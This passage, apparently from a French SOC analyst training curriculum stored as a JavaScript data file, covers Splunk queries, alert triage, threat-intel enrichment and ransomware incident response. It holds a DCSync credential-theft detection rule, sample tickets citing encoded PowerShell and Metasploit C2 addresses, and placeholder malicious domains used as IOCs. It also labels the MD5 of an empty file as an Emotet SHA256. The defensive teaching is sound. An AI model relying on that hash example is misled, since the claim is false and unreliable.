                "Importer le dataset BOTS v1 dans Splunk",
                "Question 1 : Quelle est l'IP source de l'attaquant externe ?",
                "Question 2 : Quel outil de scan a été utilisé ? (User-Agent dans les logs HTTP)",
                "Question 3 : Quel fichier malveillant a été uploadé ? (logs web)",
                "Question 4 : Quel compte a été compromis ? (Event 4624)",
                "Question 5 : Quelle technique de persistence a été utilisée ? (Event 4698/7045)",
                "Documenter la kill chain complète de l'attaque"
              ],
              livrable: "Kill chain complète de l'attaque BOTS : de la reconnaissance à l'impact, avec les requêtes SPL utilisées."
            },
            cas_concret: `## Créer une règle SIEM pour détecter DCSync

\`\`\`splunk
index=windows EventCode=4662
| where match(Properties, "1131f6aa|1131f6ab|89e95b76")
| where NOT match(SubjectUserName, ".*\\$")  ← exclure comptes machine (vrais DC)
| stats count by _time, SubjectUserName, ObjectName, IpAddress
| where count > 0
| eval severity="CRITICAL"
| eval message="DCSync detected - possible credential theft"
\`\`\`

Cette règle déclenche une alerte P1 immédiate si un compte utilisateur (non DC) tente de répliquer l'AD.`,
            exercices: [
              { titre: "SPL — 10 requêtes progressives", desc: "Série de 10 requêtes SPL à écrire, du plus simple (stats count) au plus complexe (corrélation multi-index, lookup). Dataset fourni ou BOTS.", difficulte: "avancé", type: "lab", outil: "Splunk Free" }
            ],
            questions: [
              "Comment détecter un beaconing dans Splunk en une requête SPL ?",
              "Votre SIEM génère 500 alertes/jour. Comment réduire à 50 alertes actionnables ?",
              "Qu'est-ce que la normalisation des logs et pourquoi c'est important dans un SIEM ?"
            ],
            niveau_recruteur: `Splunk SPL = compétence exigée dans 70% des offres SOC. ELK = 30%. Avoir fait BOTS = preuve de pratique réelle. La certification Splunk Core Certified User valide ces compétences.`,
            erreurs: [
              "Écrire des requêtes sans index= (scanne tout, très lent en production).",
              "Créer des alertes sans tuning (trop de faux positifs → les analystes ignorent les alertes).",
              "Ignorer les statistiques aggregées — toujours utiliser stats/timechart pour trouver les anomalies."
            ],
            resume: `SPL clés : index=, stats count by, where, sort, table, eval. Détection brute force : count > 10 en 5 min. Beaconing : count élevé + peu d'URLs uniques. BOTS = pratique terrain sur données réelles.`
          }
        },
        {
          id: "m5c2",
          titre: "Triage & Gestion des alertes",
          description: "Le workflow quotidien du SOC L1 : de la réception de l'alerte à sa clôture.",
          duree: "2 semaines",
          difficulte: "avancé",
          prerequis: ["m5c1","m4c2"],
          sous_competences: [
            "Workflow de triage SOC : qualification, investigation, escalade, clôture",
            "Niveaux de priorité P1/P2/P3/P4",
            "Faux positifs vs vrais positifs : méthodologie",
            "Ticketing : TheHive, ServiceNow, Jira SM",
            "Documentation d'un incident",
            "Métriques SOC : MTTD, MTTR",
            "Communication et escalade"
          ],
          cours: {
            simple: `Le triage d'alertes est le cœur du travail SOC L1. Chaque jour, une file d'alertes t'attend. Ton rôle : qualifier rapidement chaque alerte (vrai ou faux positif ?), investiguer les vraies, clôturer les fausses, escalader ce que tu ne peux pas traiter seul. C'est un processus structuré qui s'améliore avec la pratique.

---

## Les niveaux de priorité

| Niveau | Label | Délai de réponse | Exemples |
|--------|-------|-----------------|---------|
| **P1** | Critique | < 15 minutes | Ransomware actif, DC compromis, exfiltration en cours |
| **P2** | Haute | < 1 heure | Malware détecté, brute force réussi, C2 actif |
| **P3** | Moyenne | < 4 heures | Scan de ports, tentative de brute force, CVE détectée |
| **P4** | Faible | < 24 heures | Faux positifs probables, activité suspecte faible |

---

## Le workflow de triage — Étape par étape

### Étape 1 — Comprendre l'alerte (2 minutes)
- Quel outil a déclenché l'alerte ? (EDR, SIEM, IDS, firewall)
- Quelle règle/signature ? (Ex: "Meterpreter Reverse Shell")
- Quel endpoint / quel utilisateur / quelle IP ?
- À quelle heure ? Est-ce pendant les heures de bureau ?

### Étape 2 — Contexte (3 minutes)
- Qui est cet utilisateur ? (RH, Finance, IT, prestataire ?)
- Ce poste/serveur est-il critique ?
- D'autres alertes sur le même endpoint récemment ?
- L'IP suspecte est-elle connue dans la TI ? (VirusTotal, AbuseIPDB)

### Étape 3 — Investigation (5-15 minutes)
- EDR → arbre de processus, fichiers créés, connexions réseau
- SIEM → autres événements sur le même endpoint dans la fenêtre de temps
- Logs spécifiques selon l'alerte (auth.log, proxy, DNS...)

### Étape 4 — Verdict
- **Faux positif** → documenter pourquoi, fermer le ticket, ajuster la règle si récurrent
- **Vrai positif faible** → documenter, appliquer les mesures de remédiation de base
- **Vrai positif élevé** → **ESCALADER** au SOC L2, isoler l'endpoint si nécessaire

---

## Les faux positifs courants — À reconnaître rapidement

| Alerte | Faux positif probable si... |
|--------|---------------------------|
| Brute force SSH | Source = outil de monitoring interne (Nagios, Zabbix) |
| PowerShell encodé | Lancé par un script d'administration IT connu |
| Connexion vers IP suspecte | Mise à jour d'un logiciel (Windows Update, antivirus) |
| Scan de ports | Outil de vulnérabilité interne (Nessus, Qualys) |
| Masse de 4625 | Compte de service avec un vieux mot de passe |

**Règle :** un faux positif doit QUAND MÊME être documenté. Ça permet de voir si une règle génère trop de bruit → l'affiner.

---

## Documentation d'une alerte — Ce que le ticket doit contenir

\`\`\`
[TICKET SOC-2024-0315]
Date/Heure : 2024-01-15 14:32 UTC
Alerte : Suspicious PowerShell Execution
Source : Microsoft Defender for Endpoint
Endpoint : DESKTOP-ABC123 (alice.martin@entreprise.fr)

INVESTIGATION :
- Process : powershell.exe lancé par winword.exe (macro)
- Commandline : powershell.exe -nop -enc [base64]
- Connexion réseau : 185.220.101.42:4444 (Metasploit C2)
- IoCs trouvés : hash SHA256 = abc123..., IP = 185.220.101.42

VERDICT : Vrai Positif — Compromission active (macro Office)
ACTION : Isolé via MDE à 14:45 UTC. Escaladé L2 (ticket INC-2024-0089).
Notification RSSI en attente.

TIMELINE :
14:32 - Alerte reçue
14:34 - Investigation commencée
14:41 - Compromission confirmée
14:45 - Isolement endpoint
14:47 - Escalade L2
\`\`\`

**Règle SOC :** un ticket sans timeline et sans verdict clair = travail non fini. Ton ticket doit permettre à quelqu'un qui reprend le cas de comprendre exactement ce qui s'est passé.`,
            technique: `## Niveaux de priorité

| Priorité | Définition | Délai de réponse | Exemples |
|----------|-----------|-----------------|---------|
| P1 | Incident actif en cours, impact business | 15 min | Ransomware actif, DC compromis |
| P2 | Compromission confirmée, pas encore d'impact | 1h | Compte AD compromis, malware détecté |
| P3 | Activité suspecte nécessite investigation | 4h | Brute force en cours, scan interne |
| P4 | Alerte informationnelle, faible risque | 24h | Scan externe, faux positif probable |

## Workflow de triage complet

\`\`\`
ALERTE SIEM / EDR / Email
       ↓
1. TRIAGE INITIAL (5 min)
   - Lire le titre, la sévérité, l'heure
   - C'est quoi ? Quelle source ?
   - Vu avant (récurrent) ou nouveau ?
       ↓
2. ENRICHISSEMENT (10-15 min)
   - IPs → AbuseIPDB, VirusTotal
   - Hashes → VirusTotal
   - Domaines → URLScan, Whois
   - Utilisateur → RH, CMDB (poste critique ?)
       ↓
3. INVESTIGATION (15-30 min)
   - Corréler avec d'autres sources (logs EDR, firewall, proxy)
   - Reconstruire la timeline
   - Impact : combien de systèmes ? données sensibles ?
       ↓
4. VERDICT
   ├── Faux Positif → documenter + fermer + tuner la règle
   ├── Vrai Positif faible → remédier + documenter + fermer
   └── Vrai Positif élevé → ESCALADER L2 + ouvrir incident
       ↓
5. DOCUMENTATION
   - Ticket dans TheHive / ServiceNow
   - Timeline, IOC, actions prises
   - Leçons apprises
\`\`\`

## TheHive — Structure d'un ticket incident
\`\`\`
Case Title: [P2] Malware détecté WKS-042 - Possible compromission
TLP: AMBER
Severity: Medium
Tags: malware, powershell, T1059.001

Summary:
Alerte EDR 10:23 : chaîne WINWORD→cmd→PowerShell encodé.
Investigation confirme téléchargement payload depuis 185.x.x.x.
Service C2 beacon détecté toutes les 5 min.

Observables (IOC):
- IP: 185.220.x.x (C2)
- Hash: sha256:abc123... (payload.exe)
- Domain: evil-cdn.com
- User: john.doe

Tasks:
[x] Isoler WKS-042
[x] Bloquer IP C2 firewall
[ ] Forensique endpoint
[ ] Notifier l'utilisateur
[ ] Chercher d'autres endpoints touchés
\`\`\``,
            attaquant: `N/A — la vitesse de triage est ce qui empêche l'attaquant d'avoir le temps de se déplacer. MTTD (Mean Time to Detect) et MTTR (Mean Time to Respond) = métriques que les attaquants connaissent aussi.`,
            soc: `## Réduire les faux positifs

\`\`\`
Règle : "PowerShell encodé détecté"
Volume : 200 alertes/jour
Analyse : 180 = script de management IT (Ansible, SCCM)
           15 = scan Nessus
            5 = vrais positifs

Tuning :
- Ajouter exclusion pour les comptes de service IT
- Ajouter exclusion pour les hosts de management
- Résultat : 5 alertes/jour, toutes actionnables
\`\`\`

**Règle du tuning :** Exclure uniquement ce qui est prouvé légitime, jamais par défaut.`,
            logs_exemples: `## TheHive — Exemple de cas documenté
\`\`\`json
{
  "title": "[P2] Phishing Campaign - 47 recipients",
  "severity": "Medium",
  "startDate": "2024-01-15T09:15:00Z",
  "tags": ["phishing", "T1566.001", "email"],
  "summary": "Campagne phishing ciblant la comptabilité. 47 emails reçus, 3 PJ téléchargées, 1 exécution EDR confirmée.",
  "observables": [
    {"type": "domain", "value": "monentreprise-rh.fr", "ioc": true},
    {"type": "ip", "value": "185.x.x.x", "ioc": true},
    {"type": "hash", "value": "sha256:abc123", "ioc": true}
  ],
  "tasks": [
    {"title": "Bloquer domaine sender", "status": "Completed"},
    {"title": "Supprimer emails non ouverts", "status": "Completed"},
    {"title": "Forensique WKS-047", "status": "InProgress"}
  ]
}
\`\`\``,
            atelier: {
              titre: "Atelier : Simuler une journée de SOC L1 sur LetsDefend",
              duree: "4h",
              niveau: "avancé",
              objectif: "Traiter une file d'alertes mixtes (phishing, malware, brute force) comme un vrai analyste L1",
              contexte: "Tu prends ta garde de 8h. 15 alertes t'attendent dans la queue. Tu as 4h pour les traiter toutes.",
              outils: ["LetsDefend.io SOC Analyst tier"],
              etapes: [
                "Se connecter sur LetsDefend → Monitoring → Alert Queue",
                "Trier les alertes par sévérité (commencer par les critiques)",
                "Pour chaque alerte : enrichir → investigation → verdict → documenter",
                "Au moins 1 phishing, 1 malware, 1 brute force dans la session",
                "Documenter chaque décision dans le playbook LetsDefend",
                "Score final : précision des verdicts"
              ],
              livrable: "Score LetsDefend + capture des 3 analyses les plus intéressantes avec justification."
            },
            cas_concret: `## Escalade d'un P2 vers P1

09h15 — Alerte P3 : "SSH failed login x50"
09h20 — Investigation : brute force depuis 185.x.x.x sur srv-backup-01
09h25 — Alerte P3 bis : "New user created on srv-backup-01" (Event 4720)
09h25 — PIVOT : c'est lié ! Le brute force a réussi, l'attaquant crée un compte.
09h26 — Escalade immédiate → P1 : "Compromission active sur srv-backup-01"
09h27 — Isolation du serveur depuis l'EDR
09h30 — L2 prend la main, forensique en cours

Sans corrélation des alertes, le L1 aurait traité deux P3 séparément. La corrélation a permis de détecter l'incident P1.`,
            exercices: [
              { titre: "Classifier 30 alertes SIEM", desc: "Jeu de 30 alertes (avec logs associés). Pour chaque : P1/P2/P3/P4, TP/FP, action recommandée. Justifier en 2 phrases.", difficulte: "avancé", type: "analyse" }
            ],
            questions: [
              "Vous recevez 3 alertes en même temps : P1 ransomware, P2 compte compromis, P3 scan externe. Ordre de traitement ?",
              "Comment documenter un faux positif pour améliorer la règle SIEM ?",
              "Qu'est-ce que le MTTD et pourquoi le réduire est une priorité SOC ?"
            ],
            niveau_recruteur: `Le triage d'alertes EST le métier SOC L1. Les recruteurs veulent savoir si vous avez un processus structuré. Répondre avec le workflow en 5 étapes montre que vous comprenez le métier.`,
            erreurs: [
              "Escalader tous les P3 sans investigation — surcharge le L2 et montre un manque d'autonomie.",
              "Fermer une alerte sans documentation — perte de connaissance, impossible de tuner.",
              "Traiter les alertes dans l'ordre chronologique plutôt que par sévérité."
            ],
            resume: `Workflow : triage → enrichissement → investigation → verdict → documentation. P1 = 15 min. TP haute sévérité = isoler + escalader. Toujours documenter même les faux positifs. Corréler les alertes liées.`
          }
        },
        {
          id: "m5c3",
          titre: "Threat Intelligence opérationnelle",
          description: "Enrichir les alertes avec du contexte TI. IOC, TTPs, feeds, MISP.",
          duree: "1 semaine",
          difficulte: "avancé",
          prerequis: ["m4c1","m5c2"],
          sous_competences: [
            "IOC vs IOA vs TTP",
            "Plateformes : VirusTotal, AbuseIPDB, Shodan, URLScan",
            "Threat feeds : AlienVault OTX, OpenCTI, MISP",
            "Enrichissement automatique des alertes SIEM",
            "Pyramid of Pain — comprendre la valeur des IOC",
            "Threat Intel Report — lire et extraire les IOC"
          ],
          cours: {
            simple: `La Threat Intelligence (TI) donne du contexte à tes alertes. Une IP c'est bien — savoir qu'elle appartient à un groupe APT qui cible les banques françaises, c'est incomparablement mieux. L'enrichissement d'une alerte prend 30 secondes avec les bons outils.

---

## Les types d'IOC (Indicators of Compromise)

| Type | Exemple | Durée de vie | Outil de vérification |
|------|---------|-------------|----------------------|
| **IP** | 185.220.101.42 | Jours à semaines | AbuseIPDB, VirusTotal |
| **Domaine** | evil-malware.xyz | Semaines à mois | VirusTotal, URLhaus |
| **Hash de fichier** | SHA256: abc123... | Permanent | VirusTotal, MalwareBazaar |
| **URL** | http://evil.xyz/payload | Variable | URLhaus, VirusTotal |
| **Email** | phishing@evil.xyz | Variable | EmailRep.io |

---

## Les outils OSINT du SOC — À utiliser en 30 secondes

### VirusTotal (virustotal.com)
**Quand l'utiliser :** pour analyser un hash, une IP, un domaine, ou une URL suspecte.
- Hash de fichier → combien d'antivirus le détectent ? Quelle famille de malware ?
- IP → signalée pour quoi ? (C2, phishing, bruteforce)
- Domaine → créé quand ? Résolutions DNS récentes ?

**Exemple :** hash SHA256 \`d41d8cd98f00b204e9800998ecf8427e\` → VirusTotal → "Detected by 54/70 engines as Emotet" → vrai positif, escalader.

---

### AbuseIPDB (abuseipdb.com)
**Quand l'utiliser :** pour vérifier si une IP est connue comme malveillante.
- Score de confiance 0-100% (100% = certifiée malveillante)
- Catégories : bruteforce, C2, spam, scanning
- Signalée combien de fois et par qui

**Exemple :** IP source d'une tentative SSH → AbuseIPDB → "Confidence 98%, 1,247 reports, categories: Brute-Force, SSH" → bloquer sur le firewall + documenter.

---

### URLhaus (urlhaus.abuse.ch)
**Quand l'utiliser :** pour vérifier une URL trouvée dans des logs proxy ou un email.
- Base de données d'URLs distribuant des malwares
- Famille de malware associée (Emotet, QakBot, IcedID...)

---

### MalwareBazaar (bazaar.abuse.ch)
**Quand l'utiliser :** pour analyser un hash de fichier suspect.
- Famille de malware connue
- Tags (Emotet, Cobalt Strike, ransomware...)
- Télécharger l'échantillon pour analyse sandbox

---

## Les flux de Threat Intelligence — Feeds

**Ce que c'est :** des listes d'IOCs mis à jour automatiquement, intégrés dans le SIEM ou le firewall.

| Feed | Contenu | Gratuit ? |
|------|---------|----------|
| Abuse.ch Feodo Tracker | IPs C2 de Botnet | Gratuit |
| Emerging Threats (ET) | Règles IDS Suricata | Gratuit |
| MISP | Plateforme de partage d'IOC | Gratuit |
| CrowdStrike Intelligence | APT tracking | Payant |
| Recorded Future | Comprehensive TI | Payant |

---

## Enrichissement d'alerte — Exemple concret

**Alerte reçue :** "Connexion TCP sortante vers 45.155.205.233:8080 depuis poste COMPTA-05"

**Ton processus d'enrichissement (3 minutes) :**
1. **AbuseIPDB** : 45.155.205.233 → Confidence 94%, catégorie C2, associée à QakBot
2. **VirusTotal** : même IP → 15 moteurs la signalent, tags "qakbot", "banker"
3. **SIEM** : autres postes contactant cette IP ? → 3 autres postes sur le même subnet
4. **EDR** : processus source sur COMPTA-05 → outlook.exe → malware lancé depuis un email

**Verdict :** compromission multiple, QakBot (banker trojan), 4 postes. Escalade critique, isolement immédiat, notification RSSI.

**Règle TI :** une IP avec un score AbuseIPDB > 80% + VirusTotal positif = vrai positif avec très haute confiance. Agis sans attendre.`,
            technique: `## Pyramid of Pain

\`\`\`
DIFFICILE À CHANGER POUR L'ATTAQUANT
         ▲
   TTPs (Tactics, Techniques, Procedures)
         ▲
     Tools (outils utilisés)
         ▲
   Network/Host Artifacts
         ▲
    Domain Names
         ▲
      IP Addresses
         ▲
FACILE À CHANGER — Hash values (MD5/SHA)
\`\`\`

Bloquer un hash = l'attaquant recompile → nouveau hash en 1 minute.
Détecter un TTP = l'attaquant doit changer sa méthode d'attaque entière.

## Outils d'enrichissement

\`\`\`
IP suspecte → AbuseIPDB.com  (score confiance, rapports)
             → VirusTotal.com/ip (détections, domaines associés)
             → Shodan.io (ports ouverts, services exposés, organisation)

Hash → VirusTotal.com (détections AV, sandbox report)
       → MalwareBazaar (famille malware)

Domaine → URLScan.io (capture d'écran, certificat, redirections)
          → VirusTotal.com/url
          → Whois (date création, registrant)

URL → URLScan.io (sandbox navigateur)
     → VirusTotal.com/url
\`\`\``,
            attaquant: `Les attaquants connaissent VirusTotal — ils testent leurs malwares avant de les utiliser. Un hash "propre" sur VT ne signifie pas qu'il est sain (inconnu ≠ sain).`,
            soc: `## Enrichissement automatique SIEM + Threat Intel

\`\`\`splunk
# Lookup IOC dans Splunk
| inputlookup threat_intel_ips.csv as ti_ips
| rename ip as dest_ip
| join type=left dest_ip [search index=firewall | stats count by dest_ip]
| where count > 0 AND malicious="true"
| table _time, src_ip, dest_ip, threat_category, count
\`\`\`

## OpenCTI / MISP — Partage de TI

MISP = plateforme de partage d'IOC entre organisations.
OpenCTI = MISP plus moderne avec relations entre entités.
Utilisation SOC : importer les IOC dans le SIEM automatiquement.`,
            logs_exemples: `## Rapport VirusTotal — IP C2
\`\`\`
IP: 185.220.x.x
AS: AS58065 Packet Exchange Limited
Country: NL
Reputation: -91 (très malveillant)
Detected URLs: 847
Last analysis stats:
  malicious: 42/87
  suspicious: 15/87
Community comments: "Known Emotet C2 server"
Associated malware families: Emotet, IcedID, QBot
\`\`\`
Score -91 + Emotet/IcedID = blocage immédiat + recherche dans les logs des 30 derniers jours.`,
            atelier: {
              titre: "Atelier : Enrichir 10 IOC et rédiger un mini-rapport TI",
              duree: "1h30",
              niveau: "intermédiaire",
              objectif: "Pour chaque IOC donné, collecter le maximum de contexte et rédiger un résumé actionnable",
              contexte: "Tu reçois 10 IOC d'un incident : 3 IPs, 4 domaines, 3 hashs. Enrichis-les et produis un rapport.",
              outils: ["VirusTotal", "AbuseIPDB", "Shodan", "URLScan.io", "MalwareBazaar"],
              etapes: [
                "Pour chaque IP : AbuseIPDB (score) + VirusTotal (malware families) + Shodan (services exposés)",
                "Pour chaque domaine : URLScan.io (screenshot) + VirusTotal + Whois (date création)",
                "Pour chaque hash : VirusTotal (détections + sandbox) + MalwareBazaar (famille)",
                "Croiser les résultats : les IOC sont-ils liés ? Même campagne ?",
                "Identifier la famille de malware probable",
                "Rédiger un résumé : qui attaque, avec quoi, quelle infrastructure"
              ],
              livrable: "Rapport TI de 1 page : famille malware, infrastructure C2, TTPs identifiés, IOC à bloquer."
            },
            cas_concret: `## Enrichissement d'une alerte en 5 minutes

Alerte SIEM : poste interne contacte 45.142.x.x:8080.

\`\`\`
VirusTotal 45.142.x.x : 45/87 malicious - "Cobalt Strike C2"
AbuseIPDB 45.142.x.x : score 98/100 - 2341 rapports
Shodan 45.142.x.x : port 8080 open, SSL cert CN=evil.com
\`\`\`

Cobalt Strike = framework de post-exploitation professionnel utilisé par des groupes APT.
→ Incident P1 immédiat. Isolation. Investigation forensique complète.`,
            exercices: [{ titre: "Lire un rapport threat intel (Mandiant/CrowdStrike)", desc: "Télécharger un rapport public Mandiant ou CrowdStrike sur un APT. Extraire : TTPs MITRE, IOC (IPs, domaines, hashs), secteurs ciblés.", difficulte: "moyen", type: "recherche" }],
            questions: [
              "Pourquoi les hashs sont-ils au bas de la Pyramid of Pain ?",
              "Une IP a un score AbuseIPDB de 15/100. Bloqueriez-vous immédiatement ?",
              "Quelle est la différence entre un IOC et un TTP ?"
            ],
            niveau_recruteur: `Savoir enrichir un IOC en temps réel (VirusTotal, AbuseIPDB, Shodan) est attendu dès le L1. La Pyramid of Pain montre une compréhension conceptuelle valorisée.`,
            erreurs: ["Bloquer des IPs sur la seule base d'un score AbuseIPDB (faux positifs possibles).", "Penser qu'un fichier non détecté sur VirusTotal est forcément sain.", "Ignorer Shodan — il donne des informations sur l'infrastructure de l'attaquant."],
            resume: `IOC = hash/IP/domaine (facile à changer). TTP = technique (difficile à changer). Enrichissement : VirusTotal + AbuseIPDB + Shodan + URLScan. Pyramid of Pain : cibler les TTPs > les IOC. MISP = partage d'IOC entre organisations.`
          }
        },
        {
          id: "m5c4",
          titre: "Incident Response — De l'alerte à la clôture",
          description: "Gérer un incident de sécurité de bout en bout avec le framework PICERL.",
          duree: "2 semaines",
          difficulte: "avancé",
          prerequis: ["m5c2","m5c3"],
          sous_competences: [
            "Framework PICERL : 6 phases",
            "Plan de réponse aux incidents (IRP)",
            "Playbooks par type d'incident",
            "Communication de crise et escalade",
            "Chain of custody — collecter des preuves légalement",
            "Post-mortem et amélioration continue",
            "Métriques : MTTD, MTTR, taux de faux positifs"
          ],
          cours: {
            simple: `La réponse à incident (IR), c'est savoir quoi faire dans quel ordre, sans paniquer, quand une vraie attaque se passe. **PICERL** est le cadre standard. Les playbooks sont les procédures prédéfinies. La communication structurée distingue un bon analyste d'un excellent.

---

## PICERL — Les 6 phases de l'Incident Response

### 1. Préparation (avant l'incident)
**Ce que le SOC fait en amont :**
- Rédiger les playbooks (procédures selon le type d'incident)
- Configurer les outils (EDR, SIEM, ticketing)
- Former les équipes aux procédures
- Définir qui appeler en cas de crise (RSSI, DPO, direction)

### 2. Identification (= triage)
**Questions auxquelles répondre :**
- Qu'est-ce qui s'est passé exactement ?
- Quels systèmes sont touchés ?
- L'incident est-il encore actif ?
- Quel est le niveau de gravité ?

**Ce que tu fais en SOC L1 :** corréler les alertes, identifier la machine patient zéro, documenter la timeline.

### 3. Confinement (= stopper la propagation)
**Court terme :** isoler les systèmes compromis (EDR → Isolate Device)
**Long terme :** bloquer les IPs/domaines C2 sur le firewall, désactiver les comptes compromis

**Ce que tu fais :** isoler via l'EDR, bloquer les IoCs dans le SIEM/firewall, alerter les équipes réseau pour segmentation.

### 4. Éradication (= supprimer la menace)
- Supprimer le malware et ses artefacts (fichiers, clés registre, tâches planifiées)
- Changer tous les mots de passe compromis
- Appliquer les patches manquants

**Ce que tu fais en L1 :** fournir la liste des IoCs à l'équipe L2/L3 pour éradication complète.

### 5. Récupération (= remettre en production)
- Restaurer les systèmes depuis des sauvegardes saines
- Vérifier que la menace est bien éliminée avant de reconnecter
- Monitoring renforcé pendant 30 à 90 jours après l'incident

### 6. Lessons Learned (= améliorer)
- Post-mortem : qu'est-ce qui a fonctionné ? Qu'est-ce qui a failli ?
- Améliorer les règles de détection
- Former les utilisateurs si phishing à l'origine

---

## Types d'incidents et playbooks associés

| Type d'incident | Playbook | Actions clés L1 |
|----------------|----------|----------------|
| **Malware** | Playbook malware | Isoler endpoint, analyser hash, IoCs |
| **Ransomware** | Playbook ransomware | Isoler, couper partages réseau, appeler RSSI |
| **Phishing** | Playbook phishing | Analyser email, bloquer domaine/IP, notifier utilisateurs |
| **Brute force réussi** | Playbook compte compromis | Bloquer compte, réinitialiser MDP, vérifier activité post-compromission |
| **Exfiltration** | Playbook DLP | Identifier volume et destination, prévenir legal/DPO |

---

## Ransomware — Ce que le SOC fait dans les premières minutes

\`\`\`
T+0 min  : Alerte "Mass file encryption" sur EDR
T+2 min  : Confirmer sur 2-3 postes → ransomware actif
T+3 min  : ESCALADE CRITIQUE → appeler le L2/L3 + RSSI
T+5 min  : Isoler tous les postes touchés via EDR
T+7 min  : Couper les partages réseau (NAS, serveurs de fichiers)
T+10 min : Identifier le patient zéro (1er poste chiffré)
T+15 min : Bloquer les IoCs (IP C2, domaines) sur firewall
T+20 min : Contact équipe backup pour évaluer restoration
\`\`\`

**CE QU'ON NE FAIT PAS :** payer la rançon sans décision de la direction, redémarrer les machines (perte de preuves mémoire), reconnecter un poste isolé sans validation L2.

---

## Communication pendant un incident — Template

\`\`\`
[MISE À JOUR INCIDENT #INC-2024-0089 — 15h00]
Statut : EN COURS
Sévérité : CRITIQUE

Situation actuelle : ransomware actif, 12 postes chiffrés identifiés
Patient zéro : COMPTA-01 (vecteur initial : phishing email 14h22)

Actions en cours :
- Isolement des 12 postes via EDR (terminé)
- Partages réseau déconnectés (terminé)
- IoCs bloqués firewall (en cours, ETA 15h30)
- Analyse forensic patient zéro (en cours)

Prochaine mise à jour : 15h30
Point de contact L2 : [nom], [téléphone]
\`\`\`

**Règle IR :** une mise à jour toutes les 30 minutes pendant un incident actif, même si rien de nouveau. L'absence de communication génère de la panique.`,
            technique: `## PICERL — 6 phases

\`\`\`
P — Préparation
    Avant l'incident : playbooks, outils, contacts d'urgence,
    accès aux logs, sauvegardes testées.

I — Identification
    Confirmer que c'est un incident (pas un faux positif).
    Qualifier la sévérité. Ouvrir le ticket.

C — Confinement
    Empêcher la propagation SANS détruire les preuves.
    Court terme : isolation réseau de l'endpoint.
    Long terme : identifier tous les systèmes impactés.

E — Éradication
    Supprimer la cause : nettoyer le malware, fermer la backdoor,
    désactiver le compte compromis, patcher la vulnérabilité.

R — Récupération
    Restaurer les systèmes proprement. Surveiller la récidive.
    Vérifier avant de remettre en production.

L — Leçons apprises
    Post-mortem : qu'est-ce qui a marché ? Pas marché ?
    Comment améliorer la détection et la réponse ?
\`\`\`

## Playbook Ransomware — Exemple
\`\`\`
DÉTECTION
  □ Alerte EDR : mass file encryption
  □ Alerte partage réseau : icônes changées, extensions .locked
  □ Note de rançon présente

CONFINEMENT IMMÉDIAT (< 15 min)
  □ Isoler TOUS les endpoints infectés
  □ Déconnecter les partages réseau (NAS, serveurs de fichiers)
  □ Bloquer les C2 connus au firewall
  □ Alerter le CISO immédiatement

IDENTIFICATION
  □ Identifier la variante (ID Ransomware : id-ransomware.malwarehunterteam.com)
  □ Vérifier si un déchiffreur existe (nomoreransom.org)
  □ Évaluer l'étendue : combien de fichiers chiffrés ? Quels systèmes ?
  □ Les backups sont-ils touchés ?

ÉRADICATION
  □ Nettoyer les endpoints infectés (rebuild si doute)
  □ Identifier et fermer le vecteur d'accès initial
  □ Reset de tous les credentials compromis

RÉCUPÉRATION
  □ Restaurer depuis les backups (testés et sains)
  □ Surveillance renforcée 72h post-incident
  □ Communication aux utilisateurs

RGPD / NOTIFICATION
  □ Évaluer si données personnelles impactées
  □ Si oui : notifier la CNIL dans les 72h
  □ Documenter la notification
\`\`\``,
            attaquant: `Les ransomware modernes (double extorsion) : chiffrer ET exfiltrer les données. Si tu ne paies pas la rançon, ils publient les données. Cela force les victimes à payer même si elles ont des backups.`,
            soc: `## Communication d'incident

**Escalade L1 → L2 :**
"Incident confirmé sur WKS-042 (john.doe). Malware actif (Emotet probable), connexion C2 vers 185.x.x.x:443. Endpoint isolé à 10h47. J'ai trouvé 3 autres endpoints avec la même connexion. Besoin d'investigation forensique et d'une analyse de l'étendue. Priorité P2, potentiellement P1 si les serveurs sont touchés."

**Ce qui doit être communiqué :**
- Quoi (type d'incident)
- Qui (systèmes / utilisateurs impactés)
- Quand (heure de détection, heure probable de compromission)
- Impact actuel
- Actions déjà prises
- Ce qui est nécessaire ensuite`,
            logs_exemples: `## Timeline d'un incident ransomware
\`\`\`
J-3 14:23  Email phishing reçu par finance@victime.fr
J-3 14:31  PJ ouverte → macro → PowerShell → Emotet installé
J-3 14:35  Emotet beacon vers C2 (non détecté)
J-2 09:15  Emotet télécharge Cobalt Strike
J-2 10:00  Mouvement latéral via SMB (Pass-the-Hash)
J-2 11:30  Domain Admin compromis (DCSync)
J-1 02:00  Exfiltration données (85 GB via HTTPS)
J0  03:00  Déploiement Ryuk ransomware via GPO
J0  03:15  DÉTECTION : alerte EDR mass encryption
J0  03:20  CONFINEMENT : isolation réseau
\`\`\`
L'attaquant avait 3 jours d'avance. Détection tardive = impact maximal.`,
            atelier: {
              titre: "Atelier : Tabletop Exercise — Simulation d'incident ransomware",
              duree: "3h",
              niveau: "avancé",
              objectif: "Simuler la gestion d'un incident ransomware en groupe, de la détection à la communication",
              contexte: "08h30 — Tu prends ta garde. Alerte critique : 'Mass file encryption detected'. C'est parti.",
              outils: ["Playbook ransomware", "TheHive (simulé)", "Template de communication"],
              etapes: [
                "Phase I — Identification : confirmer le type de ransomware, évaluer l'étendue initiale",
                "Phase C — Confinement : quels systèmes isoler en premier ? Comment sans détruire les preuves ?",
                "Communication au CISO : rédiger le message d'escalade (5 lignes max)",
                "Identifier le vecteur initial (d'où vient l'attaque ?)",
                "Évaluer l'impact RGPD : y a-t-il des données personnelles chiffrées ?",
                "Rédiger le post-mortem : timeline, root cause, mesures correctives"
              ],
              livrable: "Timeline complète de l'incident, décisions prises avec justification, post-mortem avec 3 mesures correctives."
            },
            cas_concret: `## Post-mortem — Compromission par phishing

**Chronologie :**
- J-7 : Email phishing pas détecté (DMARC non configuré côté expéditeur)
- J-7 : Exécution macro Word → Emotet installé
- J-5 : Emotet actif (non détecté, pas d'EDR sur le poste)
- J0 : Ransomware déployé → détection

**Root Cause :**
1. Poste non couvert par l'EDR (exception non justifiée)
2. DMARC non configuré sur le domaine victime
3. Aucune formation phishing récente pour cet utilisateur

**Mesures correctives :**
1. Déployer l'EDR sur 100% des endpoints (pas d'exception)
2. Configurer DMARC en mode reject sur tous les domaines
3. Formation anti-phishing trimestrielle obligatoire
4. Revue des exceptions EDR tous les 3 mois`,
            exercices: [
              { titre: "Écrire un playbook complet (brute force SSH)", desc: "Rédiger un playbook de réponse pour un incident brute force SSH réussi : détection → confinement → éradication → récupération. Avec arbres de décision.", difficulte: "avancé", type: "rédaction" }
            ],
            questions: [
              "Dans quelle phase de PICERL isole-t-on un endpoint compromis ?",
              "Pourquoi est-il important de préserver les preuves avant l'éradication ?",
